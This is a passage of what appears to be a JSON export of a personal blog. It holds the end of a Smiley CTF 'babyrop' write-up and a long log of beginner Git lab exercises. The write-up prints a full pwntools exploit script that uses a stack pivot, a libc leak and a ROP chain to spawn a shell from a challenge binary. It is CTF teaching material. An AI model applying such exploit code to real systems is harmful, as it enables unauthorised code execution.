kept at 0x404030? We kept out small rop chain of pop rbp; 0x0000000000404150; leave; ret.\nThis changes our rsp to main and we can perform our exploit. Since our puts address has already been leaked, we can calculate the libc base address and use it to solve this challenge.\nThis is our ROP chain:\nrop = ROP(libc) rop.rdi = next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)) rop.rsi = 0 rop.rbp = 0x404198 rop.raw(libc.address + 0x00000000000981ad) # pop rdx ; leave ; ret rop.raw(0) rop.execve() Now we can send our final payload:\np.sendline(flat({ 0x28: rop.chain() })) We used 0x28 offset because our RIP lies here. Remember, our buffer is 0x20 bytes and saved rbp is 0x8 bytes. So our RIP lies at 0x28 offset.\n0x03 - Final Script # from pwn import * elf = context.binary = ELF(\u0026#39;./vuln_patched\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) gs = \u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\u0026#39; # ========= Gadgets ========= pop_rbp = 0x401181 leave_ret = 0x401226 pop_rcx = 0x40117e ret = 0x401227 p = process() # gdb.attach(p, gdbscript=gs) payload = flat({ 0x20:0x404038 + 0x20, #Setting this as RBP 0x28:0x0000000000401205, # RIP --\u0026gt; gets of main }, filler=b\u0026#39;\\x00\u0026#39;) log.info(f\u0026#39;Sent payload: {payload}\u0026#39;) p.sendline(payload) input(\u0026#34;Press Enter to continue...\u0026#34;) payload = flat({ 0: [ pop_rbp, # pop rbp 0x0000000000404150, # points to main address in .bss leave_ret # leave ; ret ], 0x20: elf.sym.print + 0x20, # RBP --\u0026gt; @puts+0x20 0x28: [ 0x401227, # increasing the stack space 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x401227, 0x0000000000401211, elf.sym.main] # This is the value at address 0x0000000000404150 }) log.info(f\u0026#39;Sending payload: {payload}\u0026#39;) log.info(f\u0026#39;length: {len(payload)} bytes\u0026#39;) log.info(f\u0026#39;RBP({hex(0x404038) }) + LEN({hex(len(payload)-16)}) = {hex(0x404038 + len(payload)-16)} Main address in .bss: {hex(0x404150)}\u0026#39;) p.sendline(payload) p.recvline() p.recvline() # p.recvline() libc_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) libc.address = libc_leak - libc.sym.puts log.success(f\u0026#39;{hex(libc.address) = }\u0026#39;) rop = ROP(libc) rop.rdi = next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)) rop.rsi = 0 rop.rbp = 0x404198 rop.raw(libc.address + 0x00000000000981ad) # pop rdx ; leave ; ret rop.raw(0) rop.execve() print(rop.dump()) p.sendline(flat({ 0x28: rop.chain() })) p.interactive() 0x04 - Conclusion # This challenge was a great mixture of ROP, Stack Pivot and libc leak. It taught me how to use libc gadgets to solve the challenges when there are no proper gadgets in given binary. I hope this writeup helps you to understand the challenge better.\nSpecial thanks to VulnX for helping me with this challenge and guiding me through the process. If you have any questions or suggestions, feel free to reach out to me.\nMake sure to check out VulnX\u0026rsquo;s Writeup page for more awesome writeups: VulnX Writeup\n","date":"2025-06-16","externalUrl":null,"permalink":"/posts/smiley_babyrop/","section":"","summary":"Smiley CTF - babyrop Writeup # 0x00 - Overview # Checksec on given binary:\n➜ babyrop checksec vuln [*] \u0026#39;/home/delete/CTFs/SmileyCTF/babyrop/vuln\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) This challenge is mixture of ROP, Stack Pivot and libc leak.","title":"Smiley CTF - `babyrop` Challenge Writeup","type":"posts"},{"content":"","date":"2025-06-16","externalUrl":null,"permalink":"/categories/stack-pivot/","section":"Categories","summary":"","title":"Stack Pivot","type":"categories"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/categories/bandit/","section":"Categories","summary":"","title":"Bandit","type":"categories"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/tags/development/","section":"Tags","summary":"","title":"Development","type":"tags"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":" Lab 1 # I\u0026rsquo;ve already installed ruby and set up my git global config.\nuser.name=D3LET3-57 user.email=xxxxxxxxxxxxxxxxx@gmail.com core.autocrlf=input core.safecrlf=true Lab 2 # No commands were run in this lab.\nLab 3 # mkdir hello cd hello echo \u0026#39;puts \u0026#34;Hello, World\u0026#34;\u0026#39; \u0026gt; hello.rb cat hello.rb git init git add hello.rb git commit -m \u0026#34;First Commit\u0026#34; I\u0026rsquo;ve created a new directory called hello, added a Ruby script that prints \u0026ldquo;Hello, World\u0026rdquo;, and committed it to a new git repository.\nLab 4 # ➜ hello git:(master) git status On branch master nothing to commit, working tree clean Status shows that there are no changes to commit, and the working tree is clean.\nLab 5 # ➜ hello git:(master) echo \u0026#39;puts \u0026#34;Hello, #{ARGV.first}!\u0026#34;\u0026#39; \u0026gt; hello.rb ➜ hello git:(master) ✗ cat hello.rb puts \u0026#34;Hello, #{ARGV.first}!\u0026#34; ➜ hello git:(master) ✗ git status On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: hello.rb no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) I\u0026rsquo;ve modified the hello.rb file to accept an argument and print \u0026ldquo;Hello, {argument}!\u0026rdquo;. The git status command shows that the file has been modified but not staged for commit.\nLab 6 # ➜ hello git:(master) ✗ git add hello.rb ➜ hello git:(master) ✗ git status On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: hello.rb I\u0026rsquo;ve staged the changes made to hello.rb. The git status command now shows that the file is ready to be committed.\nLab 7 # Explained about staging and committing changes in Git. Staging allows you to prepare changes before committing them to the repository. The git add command stages changes, while git commit saves those changes to the repository with a message describing the changes.\nLab 8 # ➜ hello git:(master) ✗ git commit [master 0136159] Using ARGV 1 file changed, 1 insertion(+), 1 deletion(-) ➜ hello git:(master) git status On branch master nothing to commit, working tree clean Ive got Nano as default editor, so I had to use git commit without the -m flag to write a commit message. The commit was successful, and the working tree is clean.\nLab 9 # ➜ hello git:(master) echo \u0026#39;name = ARGV.first || \u0026#34;World\u0026#34;\u0026#39; \u0026gt; hello.rb ➜ hello git:(master) ✗ echo \u0026#39;puts \u0026#34;Hello, #{name}!\u0026#34;\u0026#39; \u0026gt;\u0026gt; hello.rb ➜ hello git:(master) ✗ cat hello.rb name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(master) ✗ git add hello.rb ➜ hello git:(master) ✗ vim hello.rb ➜ hello git:(master) ✗ cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(master) ✗ git status On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: hello.rb Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: hello.rb ➜ hello git:(master) ✗ git commit -m \u0026#34;Added a default value\u0026#34; [master 0a4623a] Added a default value 1 file changed, 2 insertions(+), 1 deletion(-) ➜ hello git:(master) ✗ git status On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: hello.rb no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) ➜ hello git:(master) ✗ git add . ➜ hello git:(master) ✗ git status On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: hello.rb ➜ hello git:(master) ✗ git commit -m \u0026#34;Added a comment\u0026#34; [master 5f9df6a] Added a comment 1 file changed, 1 insertion(+) Notice how hello.rb is listed twice in the status. The first change (adding a default) is staged and is ready to be committed. The second change (adding a comment) is unstaged. If you were to commit right now, the comment would not be saved in the repository.\nLab 10 # git log git log --pretty=oneline git log --pretty=oneline --max-count=2 git log --pretty=oneline --since=\u0026#39;5 minutes ago\u0026#39; git log --pretty=oneline --until=\u0026#39;5 minutes ago\u0026#39; git log --pretty=oneline --author=\u0026lt;your name\u0026gt; git log --pretty=oneline --all git log --all --pretty=format:\u0026#39;%h %cd %s (%an)\u0026#39; --since=\u0026#39;7 days ago\u0026#39; git log --all --pretty=format:\u0026#39;%h %cd %s (%an)\u0026#39; --since=\u0026#39;7 days ago\u0026#39; --author=\u0026lt;your name\u0026gt; git log --pretty=format:\u0026#39;%h %ad | %s%d [%an]\u0026#39; --graph --date=short The --pretty=\u0026quot;...\u0026quot; option customizes how each commit is displayed in the log output. Here are some common placeholders used in the format string:\n%h: Abbreviated commit hash %d: Decorations (e.g., branch names, tags) %ad: Author date (format can be customized with --date=...) %s: Commit message (subject) %an: Author name The --graph flag adds an ASCII graph showing the branch and merge history, making it easier to visualize the commit tree. Using --date=short displays dates in a concise YYYY-MM-DD format.\nLab 11 # Added first set of aliases to ~/.gitconfig:\n[alias] co = checkout ci = commit st = status br = branch hist = log --pretty=format:\u0026#39;%h %ad | %s%d [%an]\u0026#39; --graph --date=short type = cat-file -t dump = cat-file -p Second set of aliases to .zshrc:\nalias gst=\u0026#39;git status \u0026#39; alias ga=\u0026#39;git add \u0026#39; alias gb=\u0026#39;git branch \u0026#39; alias gc=\u0026#39;git commit\u0026#39; alias gd=\u0026#39;git diff\u0026#39; alias gco=\u0026#39;git checkout \u0026#39; alias gk=\u0026#39;gitk --all\u0026amp;\u0026#39; alias gx=\u0026#39;gitx --all\u0026#39; Lab 12 # ➜ hello git:(main) git hist ➜ hello git:(main) gco 0a4623a Note: switching to \u0026#39;0a4623a\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. Example: git switch -c \u0026lt;new-branch-name\u0026gt; Or undo this operation with: git switch - Turn off this advice by setting config variable advice.detachedHead to false HEAD is now at 0a4623a Added a default value ➜ hello git:(0a4623a) cat hello.rb name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(0a4623a) gco main Previous HEAD position was 0a4623a Added a default value Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; I used the git hist alias to view the commit history, then checked out a specific commit using gco 0a4623a. After viewing the file at that commit, I switched back to the main branch using gco main.\nLab 13 # ➜ hello git:(main) git tag v1 ➜ hello git:(main) gco v1^ Note: switching to \u0026#39;v1^\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. Example: git switch -c \u0026lt;new-branch-name\u0026gt; Or undo this operation with: git switch - Turn off this advice by setting config variable advice.detachedHead to false HEAD is now at 0a4623a Added a default value ➜ hello git:(0a4623a) cat hello.rb name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(0a4623a) git tag v1-beta ➜ hello git:(v1-beta) gco v1 Previous HEAD position was 0a4623a Added a default value HEAD is now at 5f9df6a Added a comment ➜ hello git:(v1) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(v1) gco v1-beta Previous HEAD position was 5f9df6a Added a comment HEAD is now at 0a4623a Added a default value ➜ hello git:(v1-beta) cat hello.rb name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(v1-beta) git hist -a ➜ hello git:(v1-beta) gco v1 Previous HEAD position was 0a4623a Added a default value HEAD is now at 5f9df6a Added a comment ➜ hello git:(v1) git hist -a I created a tag v1 at the commit 0a4623a, then checked out the commit before the tag using gco v1^. I made a new tag v1-beta at that commit. After checking out the v1 tag, I verified that the file content was as expected. Finally, I used git hist -a to view the commit history with all branches and tags.\nLab 14 # ➜ hello git:(v1) gco main Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) vim hello.rb ➜ hello git:(main) ✗ gst On branch main Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: hello.rb no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) ➜ hello git:(main) ✗ gco hello.rb Updated 1 path from the index ➜ hello git:(main) gst On branch main nothing to commit, working tree clean ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; I switched to the main branch, modified hello.rb, and then used gco hello.rb to restore the file to its last committed state. The git status command confirmed that there were no changes left in the working tree, and the file content was restored to its previous state.\nLab 15 # ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) vim hello.rb ➜ hello git:(main) ✗ ga hello.rb ➜ hello git:(main) ✗ gst On branch main Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: hello.rb ➜ hello git:(main) ✗ cat hello.rb # This is an unwanted but staged comment name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) ✗ gco hello.rb Updated 0 paths from the index ➜ hello git:(main) ✗ cat hello.rb # This is an unwanted but staged comment name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) ✗ git reset HEAD hello.rb Unstaged changes after reset: M hello.rb ➜ hello git:(main) ✗ gco hello.rb Updated 1 path from the index ➜ hello git:(main) gst On branch main nothing to commit, working tree clean ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; I staged a change in hello.rb that I didn\u0026rsquo;t want to keep, then used git reset HEAD hello.rb to unstage it. After that, I restored the file to its last committed state using gco hello.rb, which reverted the unwanted change. The git status command confirmed that there were no changes left in the working tree, and the file content was restored to its previous state.\nLab 16 # ➜ hello git:(main) vim hello.rb ➜ hello git:(main) ✗ cat hello.rb # This is an unwanted but committed comment name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) ✗ ga hello.rb ➜ hello git:(main) ✗ gc -m \u0026#34;Oops, we didn\u0026#39;t want this commit\u0026#34; [main db8e267] Oops, we didn\u0026#39;t want this commit 1 file changed, 1 insertion(+), 1 deletion(-) ➜ hello git:(main) cat hello.rb # This is an unwanted but committed comment name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) git revert HEAD [main c4d7a0a] Revert \u0026#34;Oops, we didn\u0026#39;t want this commit\u0026#34; 1 file changed, 1 insertion(+), 1 deletion(-) ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) git hist -a I made an unwanted commit to hello.rb, then used git revert HEAD to create a new commit that undoes the changes made in the last commit. The file content was restored to its previous state, and the git hist -a command confirmed the new revert commit in the history.\nLab 17 # ➜ hello git:(main) git hist ➜ hello git:(main) git tag oops ➜ hello git:(main) git reset --hard v1 HEAD is now at 5f9df6a Added a comment ➜ hello git:(main) git hist ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; I created a tag oops at the current commit, then used git reset --hard v1 to reset the repository to the state of the v1 tag. This command discarded all changes made after the v1 tag, including the unwanted commit. The file content was restored to its state at the v1 tag, and the git hist command confirmed that the history was reset accordingly. Resets on local branches are generally safe. Any “accidents” can usually be recovered from by just resetting again with the desired commit.\nHowever, if the branch is shared on remote repositories, resetting can confuse other users sharing the branch.\nLab 18 # hello git:(main) git tag -d oops Deleted tag \u0026#39;oops\u0026#39; (was c4d7a0a) ➜ hello git:(main) git hist -a The oops tag is no longer listed in the repository.\nLab 19 # ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) vim hello.rb ➜ hello git:(main) ✗ cat hello.rb # Default is \u0026#34;World\u0026#34; # Author: D3LET3 name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) ✗ git add hello.rb ➜ hello git:(main) ✗ git commit -m \u0026#34;Add an author comment\u0026#34; [main a69a526] Add an author comment 1 file changed, 1 insertion(+) ➜ hello git:(main) cat hello.rb # Default is \u0026#34;World\u0026#34; # Author: D3LET3 name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) vim hello.rb ➜ hello git:(main) ✗ cat hello.rb # Default is \u0026#34;World\u0026#34; # Author: D3LET3 # Email: REDACTED name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) ✗ git add hello.rb ➜ hello git:(main) ✗ git commit --amend -m \u0026#34;Add an author/email comment\u0026#34; [main 85af29c] Add an author/email comment Date: Tue Jun 3 16:29:38 2025 +0530 1 file changed, 2 insertions(+) ➜ hello git:(main) git hist -a I added an author comment to hello.rb, committed it, then amended the commit to include an email address. The git hist -a command confirmed the updated commit history with the new author and email comments.\nLab 20 # ➜ hello git:(main) mkdir lib ➜ hello git:(main) git mv hello.rb lib ➜ hello git:(main) ✗ git status On branch main Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) renamed: hello.rb -\u0026gt; lib/hello.rb ➜ hello git:(main) ✗ git commit -m \u0026#34;Moved hello.rb to lib\u0026#34; [main 20e3e36] Moved hello.rb to lib 1 file changed, 0 insertions(+), 0 deletions(-) rename hello.rb =\u0026gt; lib/hello.rb (100%) ➜ hello git:(main) ls lib I moved hello.rb to a new directory called lib using git mv, then committed the change. The git status command confirmed that the file was renamed and staged for commit, and the commit history was updated accordingly.\nLab 21 # ➜ hello git:(main) vim Rakefile ➜ hello git:(main) ✗ cat Rakefile #!/usr/bin/ruby -wKU task :default =\u0026gt; :run task :run do require \u0026#39;./lib/hello\u0026#39; end ➜ hello git:(main) ✗ git add Rakefile ➜ hello git:(main) ✗ gc -m \u0026#34;Added a Rakefile\u0026#34; [main 4dbc382] Added a Rakefile 1 file changed, 8 insertions(+) create mode 100644 Rakefile ➜ hello git:(main) rake Hello, World! I created a Rakefile that defines a default task to run the hello.rb script located in the lib directory. After adding and committing the Rakefile, I ran rake, which executed the task and printed \u0026ldquo;Hello, World!\u0026rdquo; to the console.\nLab 22 # ➜ hello git:(main) ls -C .git branches COMMIT_EDITMSG config description HEAD hooks index info logs objects ORIG_HEAD packed-refs refs ➜ hello git:(main) ls -C .git/objects 01 0a 11 16 20 27 29 40 47 4d 50 59 5a 5f 6f 71 7c 84 85 8c a6 af c4 c5 db ed f2 info pack ➜ hello git:(main) ls -C .git/objects/01 3615927a2efd63ddea466b0952e481c6f73bc4 ➜ hello git:(main) cat .git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true ➜ hello git:(main) ls .git/refs heads tags ➜ hello git:(main) ls .git/refs/heads main ➜ hello git:(main) ls .git/refs/tags v1 v1-beta ➜ hello git:(main) ls .git/refs/tags/v1 .git/refs/tags/v1 ➜ hello git:(main) cat .git/refs/tags/v1 5f9df6a02d6ccc4ad98703cf84ea0e47b5aec2ff ➜ hello git:(main) cat .git/HEAD ref: refs/heads/main I explored the .git directory structure, which contains various files and directories that Git uses to manage the repository. Key components include:\n.git/objects: Stores all the objects (blobs, trees, commits) that make up the repository. .git/refs: Contains references to commits, including branches and tags. .git/config: The configuration file for the repository, which includes settings like file mode and bare repository status. .git/HEAD: Points to the current branch or commit, indicating the state of the working directory. Lab 23 # ➜ hello git:(main) git hist --max-count=1 ➜ hello git:(main) git cat-file -t 4dbc382 commit ➜ hello git:(main) git cat-file -p 4dbc382 tree 5a96ab208ab1b85cc72fcfd0ec7e7331be37a12e parent 20e3e36cf348faa3f398431ad4da63d397407098 author D3LET3-57 \u0026lt;REDACTED\u0026gt; 1748949031 +0530 committer D3LET3-57 \u0026lt;REDACTED\u0026gt; 1748949031 +0530 Added a Rakefile ➜ hello git:(main) git cat-file -p 5a96ab208ab1b85cc72fcfd0ec7e7331be37a12e 100644 blob f21f041d8674f589298d160e0a1b55e01a3d4247 Rakefile 040000 tree 6f7e18702e74ce163490b473b4f4441d852c4791 lib ➜ hello git:(main) git cat-file -p 6f7e18702e74ce163490b473b4f4441d852c4791 100644 blob 50fe9e8e7452eab5f47145f9e0f54d74f803e423 hello.rb ➜ hello git:(main) git cat-file -p 50fe9e8e7452eab5f47145f9e0f54d74f803e423 # Default is \u0026#34;World\u0026#34; # Author: D3LET3 # Email: REDACTED name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; I used git cat-file to inspect the commit object 4dbc382, which shows the tree structure and parent commit. The tree object 5a96ab208ab1b85cc72fcfd0ec7e7331be37a12e contains the files in the commit, including the Rakefile and the hello.rb file in the lib directory. The content of hello.rb is displayed, confirming the changes made in the commit.\nLab 24 # ➜ hello git:(main) gco -b greet Switched to a new branch \u0026#39;greet\u0026#39; ➜ hello git:(greet) ➜ hello git:(greet) git status On branch greet nothing to commit, working tree clean ➜ hello git:(greet) ls lib Rakefile ➜ hello git:(greet) vim lib/greeter.rb ➜ hello git:(greet) ✗ ga lib/greeter.rb ➜ hello git:(greet) ✗ gc -m \u0026#34;Added a greeter class\u0026#34; [greet 047fc2b] Added a greeter class 1 file changed, 8 insertions(+) create mode 100644 lib/greeter.rb ➜ hello git:(greet) vim lib/hello.rb ➜ hello git:(greet) ✗ ga lib/hello.rb ➜ hello git:(greet) ✗ gc -m \u0026#34;Hello uses Greeter\u0026#34; [greet e64c2f8] Hello uses Greeter 1 file changed, 6 insertions(+), 4 deletions(-) ➜ hello git:(greet) ✗ ➜ hello git:(greet) vim Rakefile ➜ hello git:(greet) ✗ ga Rakefile ➜ hello git:(greet) ✗ gc -m \u0026#34;Updated Rakefile\u0026#34; [greet cb4831a] Updated Rakefile 1 file changed, 1 insertion(+), 2 deletions(-) I created a new branch greet, added a greeter.rb class, modified hello.rb to use the Greeter class, and updated the Rakefile accordingly. Each change was staged and committed with appropriate messages. The git status command confirmed that there were no changes left to commit in the working tree.\nLab 25 # ➜ hello git:(greet) gco main Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) cat lib/hello.rb # Default is \u0026#34;World\u0026#34; # Author: D3LET3 # Email: REDACTED name = ARGV.first || \u0026#34;World\u0026#34; puts \u0026#34;Hello, #{name}!\u0026#34; ➜ hello git:(main) gco greet Switched to branch \u0026#39;greet\u0026#39; ➜ hello git:(greet) cat lib/hello.rb require \u0026#39;greeter\u0026#39; # Default is World name = ARGV.first || \u0026#34;World\u0026#34; greeter = Greeter.new(name) puts greeter.greet I switched back to the main branch to view the original hello.rb file, then switched to the greet branch to see the modified version that uses the Greeter class. The content of hello.rb in the greet branch reflects the changes made in that branch.\nLab 26 # ➜ hello git:(greet) gco main Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) vim README.md ➜ hello git:(main) ✗ cat README.md This is the Hello World example from the git tutorial. ➜ hello git:(main) ✗ git add README fatal: pathspec \u0026#39;README\u0026#39; did not match any files ➜ hello git:(main) ✗ git add README.md ➜ hello git:(main) ✗ git commit -m \u0026#34;Added README\u0026#34; [main 895a1b8] Added README 1 file changed, 2 insertions(+) create mode 100644 README.md I added a README.md file to the main branch with a brief description of the project. The file was staged and committed successfully, and the commit history was updated accordingly.\nLab 27 # hello git:(main) git hist -a * 895a1b8 2025-06-03 | Added README (HEAD -\u0026gt; main) [D3LET3-57] * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] I used git hist -a to view the commit history, which now includes the new README.md file and all previous commits. The output shows the commit hashes, dates, messages, and authors for each commit, providing a complete overview of the project\u0026rsquo;s history.\nLab 28 # hello git:(main) gco greet Switched to branch \u0026#39;greet\u0026#39; ➜ hello git:(greet) type gm gm is an alias for git merge ➜ hello git:(greet) gm main Merge made by the \u0026#39;ort\u0026#39; strategy. README.md | 2 ++ 1 file changed, 2 insertions(+) create mode 100644 README.md * 58c0382 2025-06-03 | Merge branch \u0026#39;main\u0026#39; into greet (HEAD -\u0026gt; greet) [D3LET3-57] |\\ | * 895a1b8 2025-06-03 | Added README (main) [D3LET3-57] * | cb4831a 2025-06-03 | Updated Rakefile [D3LET3-57] * | e64c2f8 2025-06-03 | Hello uses Greeter [D3LET3-57] * | 047fc2b 2025-06-03 | Added a greeter class [D3LET3-57] |/ * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] I merged the main branch into the greet branch using the gm alias for git merge. The merge was successful, and the README.md file was added to the greet branch. The commit history now reflects the merge, showing the combined changes from both branches.\nLab 29 # ➜ hello git:(greet) gco main Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) vim lib/hello.rb ➜ hello git:(main) ✗ git add lib/hello.rb ➜ hello git:(main) ✗ git commit -m \u0026#34;Made interactive\u0026#34; [main 1277033] Made interactive 1 file changed, 4 insertions(+), 5 deletions(-) ➜ hello git:(main) git hist --all * 1277033 2025-06-03 | Made interactive (HEAD -\u0026gt; main) [D3LET3-57] | * 58c0382 2025-06-03 | Merge branch \u0026#39;main\u0026#39; into greet (greet) [D3LET3-57] | |\\ | |/ |/| * | 895a1b8 2025-06-03 | Added README [D3LET3-57] | * cb4831a 2025-06-03 | Updated Rakefile [D3LET3-57] | * e64c2f8 2025-06-03 | Hello uses Greeter [D3LET3-57] | * 047fc2b 2025-06-03 | Added a greeter class [D3LET3-57] |/ * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] I modified lib/hello.rb to make it interactive, allowing the user to input their name. After staging and committing the changes, I used git hist --all to view the complete commit history across all branches. The output shows the latest commit on the main branch and the merge commit from the greet branch, along with all previous commits.\nLab 30 # ➜ hello git:(main) gco greet Switched to branch \u0026#39;greet\u0026#39; ➜ hello git:(greet) gm main Auto-merging lib/hello.rb CONFLICT (content): Merge conflict in lib/hello.rb Automatic merge failed; fix conflicts and then commit the result. ➜ hello git:(greet) ✗ cat lib/hello.rb \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD require \u0026#39;greeter\u0026#39; # Default is World name = ARGV.first || \u0026#34;World\u0026#34; greeter = Greeter.new(name) puts greeter.greet ======= puts \u0026#34;What\u0026#39;s your name\u0026#34; my_name = gets.strip puts \u0026#34;Hello, #{my_name}!\u0026#34; \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; main ➜ hello git:(greet) ✗ vim lib/hello.rb ➜ hello git:(greet) ✗ git add lib/hello.rb ➜ hello git:(greet) ✗ git commit -m 